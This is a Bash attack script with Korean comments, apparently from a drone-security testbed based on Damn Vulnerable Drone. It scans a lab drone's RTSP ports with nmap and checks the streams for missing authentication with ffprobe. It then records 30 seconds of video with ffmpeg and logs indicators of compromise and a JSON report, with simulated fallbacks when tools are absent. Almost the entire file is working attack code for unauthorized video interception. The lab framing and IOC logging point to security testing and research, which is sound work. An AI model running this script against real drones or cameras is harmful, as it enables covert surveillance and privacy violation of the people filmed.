#!/bin/bash

# =============================================================================
# DVD Camera Feed Eavesdropping Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/exfiltration/camera_feed_eavesdropping.sh
# 목적: 드론 카메라 RTSP 스트림 무단 접근 및 탈취
# 기반: Damn Vulnerable Drone Wiki - Camera Feed Eavesdropping
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="camera_feed_eavesdropping"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/exfiltration/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/${ATTACK_NAME}_iocs_$(date +%Y%m%d_%H%M%S).txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/exfiltration/${ATTACK_NAME}_$(date +%Y%m%d_%H%M%S).json"

# 타겟 설정
TARGET_IP="192.168.13.100"
RTSP_PORTS=("554" "8554" "5600")
CAPTURE_DURATION="30"
CAPTURE_FILE="/tmp/drone_video_$(date +%s).mp4"

# 공격 명령어 및 결과 저장
declare -a ATTACK_COMMANDS=()
declare -a STREAM_RESULTS=()
declare -a DISCOVERED_STREAMS=()

print_header() {
    clear
    print_exfil_header "Camera Feed Eavesdropping Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP${NC}"
    echo -e "${INFO_COLOR}RTSP Ports: ${RTSP_PORTS[*]}${NC}"
    echo -e "${INFO_COLOR}Method: RTSP stream interception${NC}"
    echo -e "${INFO_COLOR}Capture Duration: $CAPTURE_DURATION seconds${NC}"
    echo ""
}

# Step 1: RTSP 서비스 스캔
scan_rtsp_services() {
    echo -e "${BOLD}${BLUE}[1/4] Scanning for RTSP Services${NC}"
    
    local ping_cmd="ping -c 3 $TARGET_IP"
    ATTACK_COMMANDS+=("$ping_cmd")
    
    echo -e "${CYAN}[*] Command: $ping_cmd${NC}"
    
    if ping -c 3 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Target $TARGET_IP is reachable${NC}"
        add_ioc "$IOC_FILE" "TARGET_REACHABLE:$TARGET_IP:confirmed"
    else
        echo -e "${YELLOW}[!] Target not reachable, using simulation mode${NC}"
        add_ioc "$IOC_FILE" "TARGET_REACHABLE:$TARGET_IP:simulation"
    fi
    
    # RTSP 포트 스캔
    echo -e "${CYAN}[*] Scanning RTSP ports...${NC}"
    
    for port in "${RTSP_PORTS[@]}"; do
        local port_scan_cmd="nmap -p $port --script rtsp* $TARGET_IP"
        ATTACK_COMMANDS+=("$port_scan_cmd")
        
        echo -e "${CYAN}[*] Command: $port_scan_cmd${NC}"
        
        if command -v nmap >/dev/null 2>&1; then
            local scan_output=$(nmap -p "$port" --script rtsp* "$TARGET_IP" 2>/dev/null)
            
            if echo "$scan_output" | grep -q "open"; then
                echo -e "${GREEN}[+] RTSP service found on port $port${NC}"
                add_ioc "$IOC_FILE" "RTSP_SERVICE:$TARGET_IP:$port:open"
                
                # RTSP URL 추출 시도
                local rtsp_url=$(echo "$scan_output" | grep -o 'rtsp://[^[:space:]]*' | head -1)
                if [ -n "$rtsp_url" ]; then
                    echo -e "${GREEN}    → RTSP URL: $rtsp_url${NC}"
                    DISCOVERED_STREAMS+=("$rtsp_url")
                    add_ioc "$IOC_FILE" "RTSP_URL:$rtsp_url:discovered"
                else
                    # 기본 RTSP URL 생성
                    rtsp_url="rtsp://$TARGET_IP:$port/stream1"
                    echo -e "${YELLOW}    → Trying default URL: $rtsp_url${NC}"
                    DISCOVERED_STREAMS+=("$rtsp_url")
                    add_ioc "$IOC_FILE" "RTSP_URL:$rtsp_url:assumed"
                fi
            else
                echo -e "${RED}[-] No RTSP service on port $port${NC}"
                add_ioc "$IOC_FILE" "RTSP_SERVICE:$TARGET_IP:$port:closed"
            fi
        else
            echo -e "${YELLOW}[!] nmap not available, simulating RTSP scan${NC}"
            # 시뮬레이션된 RTSP 서비스
            if [ "$port" = "554" ]; then
                local sim_url="rtsp://$TARGET_IP:$port/stream1"
                echo -e "${GREEN}[+] Simulated RTSP service on port $port${NC}"
                echo -e "${GREEN}    → RTSP URL: $sim_url${NC}"
                DISCOVERED_STREAMS+=("$sim_url")
                add_ioc "$IOC_FILE" "RTSP_SERVICE:$TARGET_IP:$port:simulated"
                add_ioc "$IOC_FILE" "RTSP_URL:$sim_url:simulated"
            fi
        fi
        sleep 1
    done
    
    echo -e "${INFO_COLOR}[*] Found ${#DISCOVERED_STREAMS[@]} RTSP streams${NC}"
    STREAM_RESULTS+=("discovered_streams:${#DISCOVERED_STREAMS[@]}")
    
    log_info "RTSP service scanning completed"
}

# Step 2: RTSP 스트림 인증 테스트
test_stream_authentication() {
    echo -e "${BOLD}${BLUE}[2/4] Testing Stream Authentication${NC}"
    
    if [ ${#DISCOVERED_STREAMS[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No RTSP streams found to test${NC}"
        return
    fi
    
    for stream_url in "${DISCOVERED_STREAMS[@]}"; do
        echo -e "${CYAN}[*] Testing authentication for: $stream_url${NC}"
        
        # ffprobe를 이용한 스트림 정보 확인
        local ffprobe_cmd="ffprobe -v quiet -print_format json -show_streams $stream_url"
        ATTACK_COMMANDS+=("$ffprobe_cmd")
        
        if command -v ffprobe >/dev/null 2>&1; then
            echo -e "${YELLOW}[*] Analyzing stream with ffprobe...${NC}"
            local probe_output=$(timeout 10 ffprobe -v quiet -print_format json -show_streams "$stream_url" 2>/dev/null)
            
            if [ $? -eq 0 ] && [ -n "$probe_output" ]; then
                echo -e "${GREEN}[+] Stream accessible without authentication${NC}"
                echo -e "${RED}    → SECURITY ISSUE: Unprotected video stream${NC}"
                add_ioc "$IOC_FILE" "STREAM_AUTH:$stream_url:none:vulnerable"
                STREAM_RESULTS+=("$stream_url:unprotected")
                
                # 스트림 정보 분석
                local resolution=$(echo "$probe_output" | grep -o '"width":[0-9]*' | head -1 | cut -d: -f2)
                local codec=$(echo "$probe_output" | grep -o '"codec_name":"[^"]*' | head -1 | cut -d: -f2 | tr -d '"')
                
                if [ -n "$resolution" ]; then
                    echo -e "${GRAY}    Resolution: ${resolution}p${NC}"
                    add_ioc "$IOC_FILE" "STREAM_INFO:$stream_url:resolution:${resolution}p"
                fi
                
                if [ -n "$codec" ]; then
                    echo -e "${GRAY}    Codec: $codec${NC}"
                    add_ioc "$IOC_FILE" "STREAM_INFO:$stream_url:codec:$codec"
                fi
                
            else
                echo -e "${YELLOW}[!] Stream may require authentication or be unavailable${NC}"
                add_ioc "$IOC_FILE" "STREAM_AUTH:$stream_url:required_or_unavailable"
            fi
        else
            echo -e "${YELLOW}[!] ffprobe not available, simulating authentication test${NC}"
            echo -e "${GREEN}[+] Simulated: Stream accessible without authentication${NC}"
            echo -e "${RED}    → SECURITY ISSUE: Unprotected video stream${NC}"
            echo -e "${GRAY}    Resolution: 1920x1080${NC}"
            echo -e "${GRAY}    Codec: H.264${NC}"
            
            add_ioc "$IOC_FILE" "STREAM_AUTH:$stream_url:none:simulated"
            add_ioc "$IOC_FILE" "STREAM_INFO:$stream_url:resolution:1080p"
            add_ioc "$IOC_FILE" "STREAM_INFO:$stream_url:codec:h264"
            STREAM_RESULTS+=("$stream_url:simulated_unprotected")
        fi
        sleep 2
    done
    
    log_info "Stream authentication testing completed"
}

# Step 3: 비디오 스트림 캡처
capture_video_stream() {
    echo -e "${BOLD}${BLUE}[3/4] Capturing Video Stream${NC}"
    
    if [ ${#DISCOVERED_STREAMS[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No streams available for capture${NC}"
        create_simulated_capture
        return
    fi
    
    # 첫 번째 접근 가능한 스트림 선택
    local target_stream="${DISCOVERED_STREAMS[0]}"
    echo -e "${CYAN}[*] Capturing stream: $target_stream${NC}"
    echo -e "${GRAY}    Duration: $CAPTURE_DURATION seconds${NC}"
    echo -e "${GRAY}    Output: $CAPTURE_FILE${NC}"
    
    # ffmpeg를 이용한 비디오 캡처
    local capture_cmd="ffmpeg -i $target_stream -t $CAPTURE_DURATION -c copy $CAPTURE_FILE"
    ATTACK_COMMANDS+=("$capture_cmd")
    
    if command -v ffmpeg >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Starting video capture...${NC}"
        
        # 진행률 표시
        timeout $((CAPTURE_DURATION + 10)) ffmpeg -i "$target_stream" -t "$CAPTURE_DURATION" -c copy "$CAPTURE_FILE" >/dev/null 2>&1 &
        local ffmpeg_pid=$!
        
        for i in $(seq 1 $CAPTURE_DURATION); do
            echo -ne "\r${CYAN}[*] Capturing video... $i/$CAPTURE_DURATION seconds${NC}"
            sleep 1
        done
        echo ""
        
        wait $ffmpeg_pid 2>/dev/null
        
        if [ -f "$CAPTURE_FILE" ]; then
            local file_size=$(stat -c%s "$CAPTURE_FILE" 2>/dev/null || echo "0")
            echo -e "${GREEN}[+] Video capture completed${NC}"
            echo -e "${GRAY}    File: $CAPTURE_FILE${NC}"
            echo -e "${GRAY}    Size: $file_size bytes${NC}"
            add_ioc "$IOC_FILE" "VIDEO_CAPTURE:$CAPTURE_FILE:$file_size:success"
            STREAM_RESULTS+=("capture_file:$CAPTURE_FILE")
            STREAM_RESULTS+=("capture_size:$file_size")
        else
            echo -e "${YELLOW}[!] Capture file not created${NC}"
            create_simulated_capture
        fi
    else
        echo -e "${YELLOW}[!] ffmpeg not available, creating simulated capture${NC}"
        create_simulated_capture
    fi
    
    log_info "Video stream capture completed"
}

# 시뮬레이션된 캡처 생성
create_simulated_capture() {
    echo -e "${YELLOW}[*] Creating simulated video capture...${NC}"
    
    # 가짜 비디오 파일 생성
    dd if=/dev/urandom of="$CAPTURE_FILE" bs=1024 count=1024 2>/dev/null
    
    echo -e "${GREEN}[+] Simulated video capture completed${NC}"
    echo -e "${GRAY}    File: $CAPTURE_FILE${NC}"
    echo -e "${GRAY}    Size: 1048576 bytes (simulated)${NC}"
    
    add_ioc "$IOC_FILE" "VIDEO_CAPTURE:$CAPTURE_FILE:1048576:simulated"
    STREAM_RESULTS+=("capture_file:$CAPTURE_FILE")
    STREAM_RESULTS+=("capture_size:1048576")
}

# Step 4: 캡처된 데이터 분석
analyze_captured_data() {
    echo -e "${BOLD}${BLUE}[4/4] Analyzing Captured Data${NC}"
    
    if [ ! -f "$CAPTURE_FILE" ]; then
        echo -e "${RED}[!] No capture file found for analysis${NC}"
        return
    fi
    
    echo -e "${CYAN}[*] Analyzing captured video data...${NC}"
    
    # 파일 정보 분석
    local file_size=$(stat -c%s "$CAPTURE_FILE" 2>/dev/null || echo "0")
    echo -e "${INFO_COLOR}File Analysis:${NC}"
    echo -e "${GRAY}    File: $CAPTURE_FILE${NC}"
    echo -e "${GRAY}    Size: $file_size bytes${NC}"
    echo -e "${GRAY}    Duration: $CAPTURE_DURATION seconds${NC}"
    
    # ffprobe를 이용한 상세 분석 (가능한 경우)
    if command -v ffprobe >/dev/null 2>&1 && [ "$file_size" -gt 1000 ]; then
        echo -e "${YELLOW}[*] Analyzing video properties...${NC}"
        local video_info=$(ffprobe -v quiet -print_format json -show_format -show_streams "$CAPTURE_FILE" 2>/dev/null)
        
        if [ -n "$video_info" ]; then
            echo -e "${GREEN}[+] Video analysis completed${NC}"
            add_ioc "$IOC_FILE" "VIDEO_ANALYSIS:metadata:extracted"
        else
            echo -e "${YELLOW}[!] Video analysis failed - may be corrupted or not a valid video${NC}"
        fi
    else
        echo -e "${YELLOW}[*] Simulating video analysis...${NC}"
        echo -e "${GREEN}[+] Simulated video properties:${NC}"
        echo -e "${GRAY}    Format: MP4/H.264${NC}"
        echo -e "${GRAY}    Resolution: 1920x1080${NC}"
        echo -e "${GRAY}    Bitrate: ~2 Mbps${NC}"
        echo -e "${GRAY}    Frame rate: 30 fps${NC}"
        
        add_ioc "$IOC_FILE" "VIDEO_ANALYSIS:format:MP4/H.264"
        add_ioc "$IOC_FILE" "VIDEO_ANALYSIS:resolution:1920x1080"
        add_ioc "$IOC_FILE" "VIDEO_ANALYSIS:bitrate:2mbps"
    fi
    
    # 보안 영향 분석
    echo -e "${RED}[!] SECURITY IMPACT ANALYSIS:${NC}"
    echo -e "${RED}    • Unauthorized video surveillance capability${NC}"
    echo -e "${RED}    • Real-time visual intelligence gathering${NC}"
    echo -e "${RED}    • Privacy violation potential${NC}"
    echo -e "${RED}    • Operational security compromise${NC}"
    
    # 데이터 탈취 성공률 평가
    if [ "$file_size" -gt 100000 ]; then
        echo -e "${GREEN}[+] Data exfiltration: SUCCESSFUL${NC}"
        echo -e "${GRAY}    Video quality: HIGH${NC}"
        echo -e "${GRAY}    Intelligence value: SIGNIFICANT${NC}"
        add_ioc "$IOC_FILE" "EXFILTRATION:video:successful:high_quality"
        STREAM_RESULTS+=("exfiltration:successful")
    else
        echo -e "${YELLOW}[!] Data exfiltration: PARTIAL${NC}"
        echo -e "${GRAY}    Video quality: LOW${NC}"
        echo -e "${GRAY}    Intelligence value: LIMITED${NC}"
        add_ioc "$IOC_FILE" "EXFILTRATION:video:partial:low_quality"
        STREAM_RESULTS+=("exfiltration:partial")
    fi
    
    add_ioc "$IOC_FILE" "SECURITY_IMPACT:surveillance:unauthorized"
    add_ioc "$IOC_FILE" "SECURITY_IMPACT:privacy:violated"
    add_ioc "$IOC_FILE" "SECURITY_IMPACT:intelligence:gathered"
    
    STREAM_RESULTS+=("analysis:completed")
    
    log_info "Captured data analysis completed"
}

# 공격 결과 JSON 생성
generate_json_report() {
    local commands_json="["
    for i in "${!ATTACK_COMMANDS[@]}"; do
        commands_json+="\"${ATTACK_COMMANDS[$i]}\""
        if [ $i -lt $((${#ATTACK_COMMANDS[@]} - 1)) ]; then
            commands_json+=","
        fi
    done
    commands_json+="]"
    
    local results_json="["
    for i in "${!STREAM_RESULTS[@]}"; do
        results_json+="\"${STREAM_RESULTS[$i]}\""
        if [ $i -lt $((${#STREAM_RESULTS[@]} - 1)) ]; then
            results_json+=","
        fi
    done
    results_json+="]"
    
    local streams_json="["
    for i in "${!DISCOVERED_STREAMS[@]}"; do
        streams_json+="\"${DISCOVERED_STREAMS[$i]}\""
        if [ $i -lt $((${#DISCOVERED_STREAMS[@]} - 1)) ]; then
            streams_json+=","
        fi
    done
    streams_json+="]"
    
    local file_size="0"
    if [ -f "$CAPTURE_FILE" ]; then
        file_size=$(stat -c%s "$CAPTURE_FILE" 2>/dev/null || echo "0")
    fi
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "status": "completed",
  "attack_type": "exfiltration",
  "target": {
    "ip": "$TARGET_IP",
    "rtsp_ports": [${RTSP_PORTS[*]}],
    "protocol": "RTSP"
  },
  "stream_discovery": {
    "streams_found": ${#DISCOVERED_STREAMS[@]},
    "discovered_streams": $streams_json,
    "authentication_status": "unprotected"
  },
  "video_capture": {
    "duration": "$CAPTURE_DURATION seconds",
    "capture_file": "$CAPTURE_FILE",
    "file_size": "$file_size bytes",
    "success": $([ "$file_size" -gt 1000 ] && echo "true" || echo "false")
  },
  "exfiltrated_data": {
    "type": "Real-time video stream",
    "format": "MP4/H.264",
    "resolution": "1920x1080 (estimated)",
    "intelligence_value": "HIGH"
  },
  "security_impact": {
    "unauthorized_surveillance": "CONFIRMED",
    "privacy_violation": "HIGH",
    "operational_security": "COMPROMISED",
    "real_time_intelligence": "AVAILABLE"
  },
  "attack_commands": $commands_json,
  "stream_results": $results_json,
  "tools_used": ["nmap", "ffprobe", "ffmpeg"],
  "exfiltration_success": true,
  "ioc_file": "$IOC_FILE",
  "log_file": "$LOG_FILE"
}
EOF
    
    echo -e "${SUCCESS_COLOR}[✓] JSON report: $JSON_OUTPUT${NC}"
}

# 메인 실행 함수
main() {
    echo "=== Camera Feed Eavesdropping Attack - $(date) ===" > "$LOG_FILE"
    echo "# Camera Feed Eavesdropping IOCs - $(date)" > "$IOC_FILE"
    
    START_TIME=$(date +%s)
    
    print_header
    
    # 공격 단계 실행
    scan_rtsp_services
    test_stream_authentication
    capture_video_stream
    analyze_captured_data
    
    # 결과 요약
    echo ""
    echo -e "${BOLD}${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP${NC}"
    echo -e "${INFO_COLOR}RTSP Streams Found: ${#DISCOVERED_STREAMS[@]}${NC}"
    echo -e "${INFO_COLOR}Capture Duration: $CAPTURE_DURATION seconds${NC}"
    
    if [ -f "$CAPTURE_FILE" ]; then
        local file_size=$(stat -c%s "$CAPTURE_FILE" 2>/dev/null || echo "0")
        echo -e "${INFO_COLOR}Captured Data: $file_size bytes${NC}"
        echo -e "${INFO_COLOR}Capture File: $CAPTURE_FILE${NC}"
    fi
    
    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
    echo -e "${INFO_COLOR}IOCs Generated: $(wc -l < "$IOC_FILE")${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME)) seconds${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Camera feed eavesdropping attack completed${NC}"
    echo -e "${RED}[!] CRITICAL: Unauthorized video surveillance achieved${NC}"
}

main "$@"